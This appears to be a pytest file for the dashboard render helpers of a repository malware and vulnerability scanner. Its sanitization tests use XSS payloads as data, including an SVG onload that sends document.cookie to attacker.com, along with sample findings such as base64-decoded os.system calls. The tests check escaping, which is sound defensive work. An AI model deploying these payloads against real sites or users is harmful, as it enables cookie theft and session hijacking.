"""Tests for UI render helpers and dashboard components (agentpoi_scan/ui/)."""

from __future__ import annotations

from pathlib import Path

from agentpoi_scan.findings.model import Finding
from agentpoi_scan.findings.schemas import DashboardScanSummary, FindingDetailViewModel
from agentpoi_scan.ui.render import (
    format_autorun_panel,
    format_evidence_trail,
    format_finding_detail,
    format_findings_for_table,
    format_scan_summary,
    sanitize_snippet,
)


def _sample_finding(**kw) -> Finding:
    base = {
        "file": "setup.py",
        "lines": [42],
        "category": "malware",
        "severity": "critical",
        "title": "Encoded Subprocess Execution in Setup Phase",
        "detail": "Detected base64 payload inside os.system call",
        "scanner": "autorun_surface",
        "commit_sha": "deadbeef",
        "confidence": 0.95,
        "maliciousness": 0.95,
        "vulnerability": 0.85,
        "status": "confirmed",
        "evidence": [
            {"source": "scanner", "detail": "Detected base64 payload inside os.system call"},
            {"source": "llm_triage", "verdict": "escalate"},
        ],
        "model_trail": ["nvidia/nemotron-3.5-lightning:free", "google/gemma-4-31b-it:free"],
    }
    base.update(kw)
    return Finding(**base)


def test_sanitize_snippet_escapes_xss_payloads():
    malicious_snippets = [
        '<script>alert("XSS")</script>',
        '<img src="x" onerror="evil()"/>',
        '<svg/onload=fetch("http://attacker.com/"+document.cookie)>',
        'a = 1 < 2 && 3 > 2 # "quote" & \'apos\'',
    ]
    for snip in malicious_snippets:
        sanitized = sanitize_snippet(snip)
        assert "<script>" not in sanitized
        assert "<img" not in sanitized
        assert "<svg" not in sanitized
        # html.escape should have transformed < and >
        assert "&lt;" in sanitized or "<" not in sanitized
        assert "&gt;" in sanitized or ">" not in sanitized


def test_format_scan_summary_pydantic_validation():
    scan_meta = {
        "id": 1,
        "repo": "victim/target-repo",
        "commit_sha": "deadbeef",
        "created_at": "2026-10-29T10:00:00Z",
        "risk": {"vulnerable": 0.85, "malicious": 0.95},
    }
    severity_counts = {
        "critical": 1,
        "high": 2,
        "medium": 3,
        "low": 4,
    }

    summary = format_scan_summary(scan_meta, severity_counts, autorun_count=1)
    assert isinstance(summary, DashboardScanSummary)
    assert summary.scan_id == 1
    assert summary.repo == "victim/target-repo"
    assert summary.vulnerability_score == 0.85
    assert summary.maliciousness_score == 0.95
    assert summary.critical_count == 1
    assert summary.high_count == 2
    assert summary.medium_count == 3
    assert summary.low_count == 4
    assert summary.total_findings == 10
    assert summary.autorun_count == 1
    assert summary.isolation_level in ("container", "in-process (Weak)")


def test_format_scan_summary_empty_store():
    scan_meta = {
        "id": 2,
        "repo": "clean/repo",
        "commit_sha": "c1eaf00",
        "created_at": "2026-10-29T11:00:00Z",
        "risk": {"vulnerable": 0.0, "malicious": 0.0},
    }
    severity_counts = {"critical": 0, "high": 0, "medium": 0, "low": 0}

    summary = format_scan_summary(scan_meta, severity_counts, autorun_count=0)
    assert isinstance(summary, DashboardScanSummary)
    assert summary.total_findings == 0
    assert summary.vulnerability_score == 0.0
    assert summary.maliciousness_score == 0.0


def test_format_findings_for_table():
    f1 = _sample_finding()
    f2 = _sample_finding(
        file="utils.py",
        lines=[104],
        category="sast",
        severity="high",
        title="SQL injection risk",
        status="open",
    )
    table_rows = format_findings_for_table([f1, f2])

    assert len(table_rows) == 2
    assert table_rows[0]["file"] == "setup.py"
    assert table_rows[0]["severity"] == "critical"
    assert table_rows[0]["category"] == "malware"
    assert table_rows[0]["fingerprint"] == f1.fingerprint
    assert table_rows[1]["file"] == "utils.py"
    assert table_rows[1]["severity"] == "high"


def test_format_autorun_panel():
    f1 = _sample_finding(category="autorun", file="setup.py")
    f2 = _sample_finding(category="sast", file="app/views.py")
    f3 = _sample_finding(category="malware", file="setup.cfg")

    autorun_items = format_autorun_panel([f1, f2, f3])
    # f1 is category autorun, f3 is in setup.cfg (an autorun surface file)
    assert len(autorun_items) == 2
    files = {item["file"] for item in autorun_items}
    assert "setup.py" in files
    assert "setup.cfg" in files
    assert "app/views.py" not in files


def test_format_evidence_trail():
    finding = _sample_finding()
    trail = format_evidence_trail(finding)
    assert len(trail) == 2
    assert trail[0]["source"] == "scanner"
    assert trail[1]["source"] == "llm_triage"


def test_format_finding_detail_xss_protection():
    malicious_title = "<script>alert('title-xss')</script>"
    malicious_detail = '<img src=x onerror="steal()">'
    malicious_snippet = "os.system('<script>eval(evil)</script>')"

    finding = _sample_finding(
        title=malicious_title,
        detail=malicious_detail,
    )
    detail_model = format_finding_detail(finding, raw_snippet=malicious_snippet)

    assert isinstance(detail_model, FindingDetailViewModel)
    assert "<script>" not in detail_model.escaped_snippet
    assert "&lt;script&gt;" in detail_model.escaped_snippet
    assert detail_model.fingerprint == finding.fingerprint


def test_no_raw_unsafe_html_in_ui_modules():
    ui_dir = Path(__file__).resolve().parents[1] / "agentpoi_scan" / "ui"
    for py_file in ui_dir.glob("*.py"):
        content = py_file.read_text(encoding="utf-8")
        assert "unsafe_allow_html=True" not in content, (
            f"Prohibited unsafe_allow_html=True found in {py_file.name}"
        )


def test_format_finding_detail_defaults_to_finding_detail_when_snippet_none():
    finding = _sample_finding(detail="dangerous_code_snippet()")
    detail_model = format_finding_detail(finding)
    assert detail_model.escaped_snippet == "dangerous_code_snippet()"


def test_format_scan_summary_none_scan_handled_gracefully():
    summary = format_scan_summary(None, {"critical": 0, "high": 0, "medium": 0, "low": 0})
    assert summary.scan_id == 0
    assert summary.total_findings == 0
    assert summary.vulnerability_score == 0.0
    assert summary.maliciousness_score == 0.0


def test_is_autorun_finding_detection():
    from agentpoi_scan.ui.render import is_autorun_finding

    f_workflow = _sample_finding(file=".github/workflows/deploy.yml", category="ci_iac")
    f_circleci = _sample_finding(file=".circleci/config.yml", category="ci_iac")
    f_setup = _sample_finding(file="subfolder/setup.py", category="malware")
    f_plain = _sample_finding(file="src/calculator.py", category="sast")

    assert is_autorun_finding(f_workflow) is True
    assert is_autorun_finding(f_circleci) is True
    assert is_autorun_finding(f_setup) is True
    assert is_autorun_finding(f_plain) is False


def test_finding_snippet_persists_through_dict_roundtrip():
    finding = _sample_finding(snippet="os.system(base64.b64decode(payload))")
    data = finding.to_dict()
    assert data["snippet"] == "os.system(base64.b64decode(payload))"

    restored = Finding.from_dict(data)
    assert restored.snippet == finding.snippet
    assert restored.location == "setup.py:42"


def test_findings_table_exposes_source_location():
    finding = _sample_finding(snippet="os.system('id')")
    row = format_findings_for_table([finding])[0]
    assert row["location"] == "setup.py:42"
    assert row["file"] == "setup.py"


def test_finding_detail_prefers_source_snippet_over_description():
    finding = _sample_finding(detail="human readable description", snippet="eval(input())")
    detail_model = format_finding_detail(finding)
    assert detail_model.location == "setup.py:42"
    assert detail_model.escaped_snippet == "eval(input())"


def test_snippet_survives_scan_store_roundtrip(tmp_path):
    from agentpoi_scan.report.store import ScanStore

    store = ScanStore(tmp_path / "scan_store.sqlite3")
    try:
        scan_id = store.add_scan("owner/repo", "c0ffee", [_sample_finding(snippet="danger()")])
        loaded = store.get_findings_filtered(scan_id)
        assert len(loaded) == 1
        assert loaded[0].snippet == "danger()"
        assert loaded[0].location == "setup.py:42"
    finally:
        store.close()
